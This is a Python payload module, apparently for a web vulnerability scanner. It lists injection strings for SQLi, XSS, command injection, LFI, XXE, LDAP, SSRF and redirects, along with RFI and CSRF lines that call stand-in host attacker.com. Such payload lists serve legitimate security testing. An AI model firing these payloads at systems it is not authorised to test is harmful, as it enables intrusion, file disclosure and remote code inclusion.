SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' {0}",
    "' OR '1'='1' AND '1'='1",
    "'+OR+1=1--",
]

SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
]

# used for boolean-based blind sqli: a query that's always true should look
# like a normal response, a query that's always false should look different
BLIND_SQL_TRUE_PAYLOAD = "' OR '1'='1"
BLIND_SQL_FALSE_PAYLOAD = "' AND '1'='2"

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
]

CMD_PAYLOADS = [
    "|| ping -c 1 127.0.0.1 ||",
    "; ping -c 1 127.0.0.1",
    "& ping -c 1 127.0.0.1",
    "&& ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1 |",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\etc\\passwd",
]

HTML_PAYLOADS = [
    "<b>Injected HTML</b>",
    "<iframe src='javascript:alert(1)'></iframe>",
]

CSRF_PAYLOADS = [
    "<img src='http://attacker.com/csrf' />",
    "<iframe src='http://attacker.com/csrf'></iframe>",
]

RFI_PAYLOADS = [
    "http://attacker.com/malicious.php",
    "http://attacker.com/malicious.txt",
]

LDAP_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "*)(|(cn=*))",
    "*)(&(objectClass=*))",
    "*(|(objectClass=*))",
]

XXE_PAYLOADS = [
    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><foo>&xxe;</foo>',
]

SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:80",
]

REDIRECT_PAYLOADS = [
    "http://evil.com",
    "http://phishing.com",
]
